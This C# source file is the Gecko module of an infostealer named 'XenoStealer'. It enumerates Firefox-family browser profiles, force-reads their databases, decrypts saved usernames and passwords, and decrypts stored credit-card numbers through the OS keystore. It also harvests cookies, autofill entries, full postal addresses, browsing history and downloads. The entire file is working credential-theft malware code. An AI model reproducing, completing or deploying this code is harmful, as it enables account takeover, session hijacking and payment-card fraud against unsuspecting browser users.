using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Web.Script.Serialization;
using static XenoStealer.DataExtractionStructs;

namespace XenoStealer
{
    public static class Gecko
    {
        public static DataExtractionStructs.GeckoBrowser[] GetAllInfo(GeckoBrowserOptions options) 
        {
            List<DataExtractionStructs.GeckoBrowser> browsers = new List<DataExtractionStructs.GeckoBrowser>();

            bool ShouldGetLogins = (options & GeckoBrowserOptions.Logins) == GeckoBrowserOptions.Logins;
            bool ShouldGetCookies = (options & GeckoBrowserOptions.Cookies) == GeckoBrowserOptions.Cookies;
            bool ShouldGetAutofills = (options & GeckoBrowserOptions.Autofills) == GeckoBrowserOptions.Autofills;
            bool ShouldGetDownloads = (options & GeckoBrowserOptions.Downloads) == GeckoBrowserOptions.Downloads;
            bool ShouldGetHistory = (options & GeckoBrowserOptions.History) == GeckoBrowserOptions.History;
            bool shouldGetCreditCards = (options & GeckoBrowserOptions.CreditCards) == GeckoBrowserOptions.CreditCards;
            bool shouldGetAddresses = (options & GeckoBrowserOptions.Addresses) == GeckoBrowserOptions.Addresses;


            if (!ShouldGetLogins && !ShouldGetCookies && !ShouldGetAutofills) 
            {
                return new DataExtractionStructs.GeckoBrowser[0];
            }

            foreach (KeyValuePair<string, string> browserInfo in Configuration.GeckoBrowsers) 
            {
                List<DataExtractionStructs.GeckoProfile> profiles = new List<DataExtractionStructs.GeckoProfile>();

                GeckoDecryptor decryptor = null;

                bool GetBrowserLogins = ShouldGetLogins;

                string browserName = browserInfo.Key;
                string browserProfilesPath = browserInfo.Value;
                string browserLibraryPath = Configuration.GeckoLibraryPaths[browserName];
                if (!Directory.Exists(browserProfilesPath)) 
                {
                    continue;
                }
                if (GetBrowserLogins) 
                {
                    if (!Directory.Exists(browserProfilesPath))
                    {
                        GetBrowserLogins = false;
                    }
                    else 
                    {
                        decryptor = new GeckoDecryptor(browserLibraryPath);
                        GetBrowserLogins = decryptor.Operational;
                    }
                }

                foreach (string profilePath in Directory.GetDirectories(browserProfilesPath)) 
                {
                    string profileName = new DirectoryInfo(profilePath).Name;

                    GeckoLogin[] logins = null;
                    GeckoCookie[] cookies = null;
                    GeckoAutoFill[] autofills = null;
                    GeckoDownload[] downloads = null;
                    GeckoHistoryEntry[] history = null;
                    GeckoCreditCard[] creditCards = null;
                    GeckoAddressInfo[] addresses = null;


                    if (GetBrowserLogins) 
                    {
                        logins = GetLogins(profilePath, decryptor);
                    }
                    if (ShouldGetCookies) 
                    {
                        cookies = GetCookies(profilePath);
                    }
                    if (ShouldGetAutofills) 
                    { 
                        autofills = GetAutoFills(profilePath);
                    }

                    if (ShouldGetDownloads) 
                    { 
                        downloads = GetDownloads(profilePath);
                    }

                    if (ShouldGetHistory) 
                    { 
                        history = GetHistory(profilePath);
                    }

                    if (shouldGetCreditCards) 
                    { 
                        creditCards = GetCreditCards(profilePath);
                    }

                    if (shouldGetAddresses) 
                    { 
                        addresses = GetAddresses(profilePath);
                    }

                    if (logins == null && cookies == null && autofills == null && downloads == null && history == null && creditCards == null && addresses == null) 
                    {
                        continue;
                    }

                    profiles.Add(new GeckoProfile(logins, cookies, autofills, downloads, history, creditCards, addresses, profileName));
                }

                decryptor?.Dispose();

                browsers.Add(new GeckoBrowser(profiles.ToArray(), browserName));
            }

            return browsers.ToArray();
        }
        public static DataExtractionStructs.GeckoAutoFill[] GetAutoFills(string profilePath) 
        {
            List<DataExtractionStructs.GeckoAutoFill> autoFills = new List<DataExtractionStructs.GeckoAutoFill>();
            string db_location = Path.Combine(profilePath, "formhistory.sqlite");
            if (!File.Exists(db_location))
            {
                return null;
            }

            byte[] fileBytes = Utils.ForceReadFile(db_location);
            if (fileBytes == null)
            {
                return null;
            }

            SqlLite3Parser parser;
            try
            {
                parser = new SqlLite3Parser(fileBytes);
            }
            catch
            {
                return null;
            }

            if (!parser.ReadTable("moz_formhistory"))
            {
                return null;
            }

            for (int i = 0; i < parser.GetRowCount(); i++)
            {
                object name_obj = parser.GetValue(i, "fieldname");
                object value_obj = parser.GetValue(i, "value");

                if (name_obj.GetType() != typeof(string) || value_obj.GetType() != typeof(string)) 
                {
                    continue;
                }


                string name = (string)name_obj;
                string value = (string)value_obj;

                if (name == null || value == null) 
                { 
                    continue; 
                }
                autoFills.Add(new DataExtractionStructs.GeckoAutoFill(name, value));
            }

            return autoFills.ToArray();

        }
        public static DataExtractionStructs.GeckoCookie[] GetCookies(string profilePath)
        {
            List<DataExtractionStructs.GeckoCookie> cookies = new List<DataExtractionStructs.GeckoCookie>();

            string db_location = Path.Combine(profilePath, "cookies.sqlite");
            if (!File.Exists(db_location)) 
            {
                return null;
            }

            byte[] fileBytes=Utils.ForceReadFile(db_location);
            if (fileBytes == null) 
            {
                return null;
            }

            SqlLite3Parser parser;
            try 
            {
                parser = new SqlLite3Parser(fileBytes);
            } 
            catch 
            {
                return null;
            }

            if (!parser.ReadTable("moz_cookies"))
            {
                return null;
            }

            for (int i = 0; i < parser.GetRowCount(); i++) 
            {
                try
                {
                    object host_obj = parser.GetValue(i, "host");
                    object name_obj = parser.GetValue(i, "name");
                    object value_obj = parser.GetValue(i, "value");
                    object path_obj = parser.GetValue(i, "path");

                    object expiry_obj = parser.GetValue(i, "expiry");

                    object secure_obj = parser.GetValue(i, "isSecure");
                    object httpOnly_obj = parser.GetValue(i, "isHttpOnly");

                    if (host_obj.GetType() != typeof(string) || name_obj.GetType() != typeof(string) || value_obj.GetType() != typeof(string) || path_obj.GetType() != typeof(string) || expiry_obj.GetType() != typeof(int) || secure_obj.GetType() != typeof(int) || httpOnly_obj.GetType() != typeof(int)) 
                    {
                        continue;
                    }

                    string host = (string)host_obj;
                    string name = (string)name_obj;
                    string value = (string)value_obj;
                    string path = (string)path_obj;
                    int expiry = (int)expiry_obj;
                    bool secure = (int)secure_obj == 1;
                    bool httpOnly = (int)httpOnly_obj == 1;
                    cookies.Add(new DataExtractionStructs.GeckoCookie(host, path, name, value, expiry, secure, httpOnly));
                }
                catch 
                {
                    continue;
                }

            }

            return cookies.ToArray();

        }
        public static DataExtractionStructs.GeckoLogin[] GetLogins(string profilePath, GeckoDecryptor decryptor) 
        {
            List<DataExtractionStructs.GeckoLogin> logins = new List<DataExtractionStructs.GeckoLogin>();


            if (!decryptor.SetProfilePath(profilePath)) 
            {
                return null;
                //fail.
            }

            string SQLpath = Path.Combine(profilePath, "signons.sqlite");
            string JSONpath = Path.Combine(profilePath, "logins.json");
            if (File.Exists(SQLpath) && new FileInfo(SQLpath).Length > 100)
            {
                byte[] sqlFileBytes = Utils.ForceReadFile(SQLpath);

                if (sqlFileBytes == null) 
                {
                    return null;
                    //fail.
                }


                SqlLite3Parser parser;

                try 
                {
                    parser=new SqlLite3Parser(sqlFileBytes);
                } 
                catch 
                {
                    return null;
                    //fail.
                }

                if (!parser.ReadTable("moz_logins")) 
                { 
                    return null;
                    //fail.
                }

                for (int i = 0; i < parser.GetRowCount(); i++)
                {
                    try
                    {

                        object hostname_obj = parser.GetValue(i, "hostname");
                        object encryptedUsername_obj = parser.GetValue(i, "encryptedUsername");
                        object encryptedPassword_obj = parser.GetValue(i, "encryptedPassword");

                        if (hostname_obj.GetType() != typeof(string) || encryptedUsername_obj.GetType() != typeof(string) || encryptedPassword_obj.GetType() != typeof(string)) 
                        {
                            continue;
                        }

                        string hostname = (string)hostname_obj;
                        string encryptedUsername = (string)encryptedUsername_obj;
                        string encryptedPassword = (string)encryptedPassword_obj;
                        string username = decryptor.Decrypt(encryptedUsername);
                        string password = decryptor.Decrypt(encryptedPassword);
                        if (hostname == null || username == null || password == null) continue;
                        logins.Add(new DataExtractionStructs.GeckoLogin(username, password, hostname));
                        //add it to passwords and stuff.
                    }
                    catch 
                    {
                        continue;//even if it errors, allow it to finish looping, it could be a single.
                    }
                }


            }
            else if (File.Exists(JSONpath))
            {
                string jsonText =  Utils.ForceReadFileString(JSONpath);

                if (jsonText == null) 
                { 
                    return null;
                    //fail.
                }
                
                dynamic jsonObject;

                try 
                {
                    JavaScriptSerializer serializer = new JavaScriptSerializer();
                    jsonObject = serializer.Deserialize<dynamic>(jsonText);
                } 
                catch 
                { 
                    return null;
                    //fail.
                }

                if (jsonObject != null && jsonObject.ContainsKey("logins"))
                {
                    dynamic[] json_logins = jsonObject["logins"];
                    foreach (dynamic login in json_logins)
                    {
                        if (login != null && login.GetType() == typeof(Dictionary<string, object>)  && login.ContainsKey("hostname") && login.ContainsKey("encryptedUsername") && login.ContainsKey("encryptedPassword"))
                        {
                            try
                            {
                                string hostname = (string)login["hostname"];
                                string encryptedUsername = (string)login["encryptedUsername"];
                                string encryptedPassword = (string)login["encryptedPassword"];
                                string username = decryptor.Decrypt(encryptedUsername);
                                string password = decryptor.Decrypt(encryptedPassword);
                                if (hostname == null || username == null || password == null) continue;
                                logins.Add(new DataExtractionStructs.GeckoLogin(username, password, hostname));
                                //add it to passwords and stuff.
                            }
                            catch 
                            {
                                continue;//even if it errors, allow it to finish looping, it could be a single.
                            }
                            
                        }
                    }
                }
                else 
                {
                    return null;
                    //fail.
                }

            }
            else 
            {
                return null;
                //fail.
            }

            return logins.ToArray();
        }
        public static DataExtractionStructs.GeckoDownload[] GetDownloads(string profilePath) 
        {
            List<DataExtractionStructs.GeckoDownload> downloads = new List<DataExtractionStructs.GeckoDownload>();
            string db_location = Path.Combine(profilePath, "places.sqlite");
            if (!File.Exists(db_location))
            {
                return null;
            }

            byte[] fileBytes = Utils.ForceReadFile(db_location);
            if (fileBytes == null)
            {
                return null;
            }
            SqlLite3Parser parser;
            try
            {
                parser = new SqlLite3Parser(fileBytes);
            }
            catch
            {
                return null;
            }
            Dictionary<int, string> Id2DownloadLocation = new Dictionary<int, string>();
            

            //moz_annos for the filepath
            //i think you need to match the id for the download url.

            if (!parser.ReadTable("moz_annos"))
            {
                return null;
            }

            for (int i = 0; i < parser.GetRowCount(); i++)
            {
                object id_obj = parser.GetValue(i, "place_id");
                object content_obj = parser.GetValue(i, "content");

                if (content_obj.GetType() != typeof(string) || (id_obj.GetType() != typeof(byte) && id_obj.GetType() != typeof(int))) 
                {
                    continue;
                }

                int id = id_obj.GetType()==typeof(byte)?(byte)id_obj:(int)id_obj;
                string content = (string)content_obj;
                if (content.StartsWith("file://")) 
                {
                    Id2DownloadLocation[id] = content;
                }
            }

            if (!parser.ReadTable("moz_places"))
            {
                return null;
            }

            int[] ids = Id2DownloadLocation.Keys.ToArray();

            for (int i = 0; i < parser.GetRowCount(); i++)
            {
                object id_obj = parser.GetValue(i, "id");
                if (id_obj.GetType() != typeof(byte) && id_obj.GetType() != typeof(int))
                {
                    continue;
                }

                int id = id_obj.GetType() == typeof(byte) ? (byte)id_obj : (int)id_obj;
                if (ids.Contains(id)) 
                {
                    object url_obj = parser.GetValue(i, "url");
                    if (url_obj.GetType() != typeof(string)) 
                    {
                        continue;
                    }
                    string url = (string)url_obj;

                    downloads.Add(new GeckoDownload(url, Id2DownloadLocation[id]));

                }
            }

            return downloads.ToArray();
        }
        public static DataExtractionStructs.GeckoHistoryEntry[] GetHistory(string profilePath) 
        {
            List<DataExtractionStructs.GeckoHistoryEntry> history = new List<DataExtractionStructs.GeckoHistoryEntry>();
            string db_location = Path.Combine(profilePath, "places.sqlite");
            if (!File.Exists(db_location))
            {
                return null;
            }

            byte[] fileBytes = Utils.ForceReadFile(db_location);
            if (fileBytes == null)
            {
                return null;
            }
            SqlLite3Parser parser;
            try
            {
                parser = new SqlLite3Parser(fileBytes);
            }
            catch
            {
                return null;
            }
            if (!parser.ReadTable("moz_places"))
            {
                return null;
            }

            for (int i = 0; i < parser.GetRowCount(); i++) 
            {
                object url_obj = parser.GetValue(i, "url");
                object hidden_obj = parser.GetValue(i, "hidden");
                if (url_obj.GetType() != typeof(string) || hidden_obj.GetType() != typeof(int)) 
                {
                    continue;
                }
                string url = (string)url_obj;
                bool hidden = (int)hidden_obj == 1;

                if (hidden) 
                {
                    continue;
                }

                history.Add(new GeckoHistoryEntry(url));

            }
            history.Reverse();//make it display newest first, oldest last.
            return history.ToArray();
        }
        public static DataExtractionStructs.GeckoCreditCard[] GetCreditCards(string profilePath) 
        {
            List<DataExtractionStructs.GeckoCreditCard> creditCards = new List<GeckoCreditCard>();
            string json_location = Path.Combine(profilePath, "autofill-profiles.json");
            if (!File.Exists(json_location))
            {
                return null;
            }


            string jsonText = Utils.ForceReadFileString(json_location);

            if (jsonText == null)
            {
                return null;
                //fail.
            }

            dynamic jsonObject;

            try
            {
                JavaScriptSerializer serializer = new JavaScriptSerializer();
                jsonObject = serializer.Deserialize<dynamic>(jsonText);
            }
            catch
            {
                return null;
                //fail.
            }

            if (jsonObject==null || jsonObject.GetType() != typeof(Dictionary<string, object>) || !jsonObject.ContainsKey("creditCards")) 
            {
                return null;
            }

            jsonObject = jsonObject["creditCards"];

            if (jsonObject.GetType() != typeof(object[])) 
            {
                return null;
            }

            foreach (object i in jsonObject)
            {
                if (i.GetType() != typeof(Dictionary<string, object>))
                {
                    return null;
                }

                Dictionary<string, object> cardData = (Dictionary<string, object>)i;

                if (!cardData.ContainsKey("cc-exp-month") || cardData["cc-exp-month"].GetType() != typeof(int) || !cardData.ContainsKey("cc-exp-year") || cardData["cc-exp-year"].GetType() != typeof(int) || !cardData.ContainsKey("cc-name") || cardData["cc-name"].GetType() != typeof(string) || !cardData.ContainsKey("cc-type") || cardData["cc-type"].GetType() != typeof(string) || !cardData.ContainsKey("cc-number-encrypted") || cardData["cc-number-encrypted"].GetType() != typeof(string))
                {
                    continue;
                }
                string name = (string)cardData["cc-name"];
                string type = (string)cardData["cc-type"];
                int month = (int)cardData["cc-exp-month"];
                int year = (int)cardData["cc-exp-year"];

                string EncryptedCard = (string)cardData["cc-number-encrypted"];

                string MOZAPPBASENAME = GeckoDecryptor.GetMOZAPPBASENAMEFromProfilePath(profilePath);

                if (MOZAPPBASENAME == null)
                {
                    return null;
                }

                byte[] cardBuffer = GeckoDecryptor.OsKeyStoreDecrypt(MOZAPPBASENAME, EncryptedCard);

                if (cardBuffer == null) 
                {
                    return null;
                }

                string cardNumber = Encoding.UTF8.GetString(cardBuffer);

                creditCards.Add(new DataExtractionStructs.GeckoCreditCard(name, type, cardNumber, month, year));

            }
            return creditCards.ToArray();

        }
        public static DataExtractionStructs.GeckoAddressInfo[] GetAddresses(string profilePath) 
        {
            List<DataExtractionStructs.GeckoAddressInfo> addresses = new List<GeckoAddressInfo>();
            string json_location = Path.Combine(profilePath, "autofill-profiles.json");
            if (!File.Exists(json_location))
            {
                return null;
            }


            string jsonText = Utils.ForceReadFileString(json_location);

            if (jsonText == null)
            {
                return null;
                //fail.
            }

            dynamic jsonObject;

            try
            {
                JavaScriptSerializer serializer = new JavaScriptSerializer();
                jsonObject = serializer.Deserialize<dynamic>(jsonText);
            }
            catch
            {
                return null;
                //fail.
            }

            if (jsonObject == null || jsonObject.GetType() != typeof(Dictionary<string, object>) || !jsonObject.ContainsKey("addresses"))
            {
                return null;
            }

            jsonObject = jsonObject["addresses"];

            if (jsonObject.GetType() != typeof(object[]))
            {
                return null;
            }

            foreach (object i in jsonObject)
            {
                if (i.GetType() != typeof(Dictionary<string, object>))
                {
                    return null;
                }

                Dictionary<string, object> addressData = (Dictionary<string, object>)i;

                if (!addressData.ContainsKey("name") || addressData["name"].GetType() != typeof(string) ||
                    !addressData.ContainsKey("organization") || addressData["organization"].GetType() != typeof(string) ||
                    !addressData.ContainsKey("street-address") || addressData["street-address"].GetType() != typeof(string) ||
                    !addressData.ContainsKey("address-level2") || addressData["address-level2"].GetType() != typeof(string) ||
                    !addressData.ContainsKey("address-level1") || addressData["address-level1"].GetType() != typeof(string) ||
                    !addressData.ContainsKey("postal-code") || addressData["postal-code"].GetType() != typeof(string) ||
                    !addressData.ContainsKey("country") || addressData["country"].GetType() != typeof(string) ||
                    !addressData.ContainsKey("tel") || addressData["tel"].GetType() != typeof(string) ||
                    !addressData.ContainsKey("email") || addressData["email"].GetType() != typeof(string) ||
                    !addressData.ContainsKey("given-name") || addressData["given-name"].GetType() != typeof(string) ||
                    !addressData.ContainsKey("additional-name") || addressData["additional-name"].GetType() != typeof(string) ||
                    !addressData.ContainsKey("family-name") || addressData["family-name"].GetType() != typeof(string) ||
                    !addressData.ContainsKey("address-line1") || addressData["address-line1"].GetType() != typeof(string) ||
                    !addressData.ContainsKey("address-line2") || addressData["address-line2"].GetType() != typeof(string) ||
                    !addressData.ContainsKey("address-line3") || addressData["address-line3"].GetType() != typeof(string) ||
                    !addressData.ContainsKey("country-name") || addressData["country-name"].GetType() != typeof(string) ||
                    !addressData.ContainsKey("tel-national") || addressData["tel-national"].GetType() != typeof(string) ||
                    !addressData.ContainsKey("tel-country-code") || addressData["tel-country-code"].GetType() != typeof(string) ||
                    !addressData.ContainsKey("tel-area-code") || addressData["tel-area-code"].GetType() != typeof(string) ||
                    !addressData.ContainsKey("tel-local") || addressData["tel-local"].GetType() != typeof(string) ||
                    !addressData.ContainsKey("tel-local-prefix") || addressData["tel-local-prefix"].GetType() != typeof(string) ||
                    !addressData.ContainsKey("tel-local-suffix") || addressData["tel-local-suffix"].GetType() != typeof(string))
                {
                    return null;
                }


                string name = (string)addressData["name"];
                string organization = (string)addressData["organization"];
                string streetAddress = (string)addressData["street-address"];
                string addressLevel2 = (string)addressData["address-level2"];
                string addressLevel1 = (string)addressData["address-level1"];
                string postalCode = (string)addressData["postal-code"];
                string country = (string)addressData["country"];
                string tel = (string)addressData["tel"];
                string email = (string)addressData["email"];
                string givenName = (string)addressData["given-name"];
                string additionalName = (string)addressData["additional-name"];
                string familyName = (string)addressData["family-name"];
                string addressLine1 = (string)addressData["address-line1"];
                string addressLine2 = (string)addressData["address-line2"];
                string addressLine3 = (string)addressData["address-line3"];
                string countryName = (string)addressData["country-name"];
                string telNational = (string)addressData["tel-national"];
                string telCountryCode = (string)addressData["tel-country-code"];
                string telAreaCode = (string)addressData["tel-area-code"];
                string telLocal = (string)addressData["tel-local"];
                string telLocalPrefix = (string)addressData["tel-local-prefix"];
                string telLocalSuffix = (string)addressData["tel-local-suffix"];


                addresses.Add(new DataExtractionStructs.GeckoAddressInfo(
                    name, organization, streetAddress, addressLevel2, addressLevel1, postalCode, country, tel, email,
                    givenName, additionalName, familyName, addressLine1, addressLine2, addressLine3, countryName,
                    telNational, telCountryCode, telAreaCode, telLocal, telLocalPrefix, telLocalSuffix));

            }

            return addresses.ToArray();

        }

    }
}
